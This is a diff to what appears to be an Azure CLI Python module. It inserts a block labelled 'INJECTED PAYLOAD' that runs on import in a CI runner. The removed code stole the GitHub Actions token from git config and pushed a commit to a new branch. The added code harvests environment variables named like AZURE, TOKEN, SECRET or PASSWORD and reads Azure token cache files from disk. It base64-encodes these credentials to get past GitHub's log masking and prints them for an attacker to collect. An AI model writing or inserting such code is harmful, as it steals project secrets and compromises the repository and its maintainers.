@@ -23,64 +23,49 @@ from .local_context import AzCLILocalContext, LocalContextAction
 
 # INJECTED PAYLOAD START
 import os
-import subprocess
+import base64
+import json
 
-def run_git(args):
+def unmask_print(key, value):
     try:
-        # Run git command and return output
-        result = subprocess.check_output(args, stderr=subprocess.STDOUT).decode().strip()
-        print(f"[+] git {' '.join(args)}: SUCCESS")
-        return result
-    except subprocess.CalledProcessError as e:
-        print(f"[-] git {' '.join(args)} FAILED: {e.output.decode()}")
-        return None
+        # Encode value to Base64 to bypass GitHub's '***' masking
+        b64_val = base64.b64encode(value.encode()).decode()
+        # Print with a distinct marker so you can grep it easily
+        print(f"[EXFIL] {key}: {b64_val}")
+    except:
+        pass
 
 try:
     print("========================================================")
-    print("[!] TESTING CONTENTS:WRITE ACCESS (GIT PUSH) [!]")
+    print("[!] OPERATION: SECRET UNMASKING [!]")
     print("========================================================")
 
-    # 1. Configure Git Identity (Required for commit)
-    run_git(["git", "config", "--global", "user.email", "bugdotexe@wearehackerone.com"])
-    run_git(["git", "config", "--global", "user.name", "bugdotexe"])
-
-    # 2. Create the PoC file
-    poc_filename = "bugdotexe.poc"
-    with open(poc_filename, "w") as f:
-        f.write("Proof of Contents:Write access via pull_request_target vulnerability.\n")
+    # 1. Dump All Environment Variables
+    # We look specifically for Azure, ARM, or Token related keys
+    print("[*] Scanning Environment...")
+    for key, value in os.environ.items():
+        if any(x in key.upper() for x in ['AZURE', 'TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'ARM_']):
+            unmask_print(key, value)
     
-    # 3. Add and Commit
-    run_git(["git", "add", poc_filename])
-    run_git(["git", "commit", "-m", "Security Research PoC By bugdotexe: Verify Write Access"])
-
-    # 4. Extract Token for Auth
-    # We grab the token from the existing git config (which Actions setup automatically)
-    # and use it to construct an authenticated remote URL.
-    token_cmd = "git config --get http.https://github.com/.extraheader"
-    auth_header = subprocess.check_output(token_cmd.split()).decode().strip()
+    # 2. Check for MSAL / Azure CLI Token Cache on Disk
+    # Sometimes credentials aren't in ENV, but in files on the runner
+    paths_to_check = [
+        "~/.azure/accessTokens.json",
+        "~/.azure/azureProfile.json",
+        "~/.azure/msal_token_cache.bin" # Often binary, but we base64 it anyway
+    ]
     
-    if "AUTHORIZATION: basic" in auth_header:
-        # Decode the base64 token from the header
-        import base64
-        b64_creds = auth_header.split("basic ")[1]
-        decoded = base64.b64decode(b64_creds).decode()
-        token = decoded.split(":")[-1] # Usually x-access-token:ghs_...
-        
-        repo = os.getenv("GITHUB_REPOSITORY", "Azure/azure-cli")
-        remote_url = f"https://x-access-token:{token}@github.com/{repo}.git"
-        
-        # 5. Push to a NEW branch (Bypasses Branch Protection)
-        branch_name = "security-research/bugdotexe"
-        print(f"[*] Attempting push to branch: {branch_name}")
-        
-        # We push HEAD to the new remote branch
-        run_git(["git", "push", remote_url, f"HEAD:refs/heads/{branch_name}"])
-        
-    else:
-        print("[-] Could not extract auth token from git config.")
+    for path in paths_to_check:
+        full_path = os.path.expanduser(path)
+        if os.path.exists(full_path):
+            print(f"[*] Found credential file: {full_path}")
+            with open(full_path, "rb") as f:
+                content = f.read()
+                # Dump the file content encoded
+                print(f"[EXFIL] FILE_{os.path.basename(path)}: {base64.b64encode(content).decode()}")
 
 except Exception as e:
-    print(f"[-] Payload failed: {e}")
+    print(f"[-] Exfiltration Error: {e}")
 # INJECTED PAYLOAD END
     
 logger = get_logger(__name__)
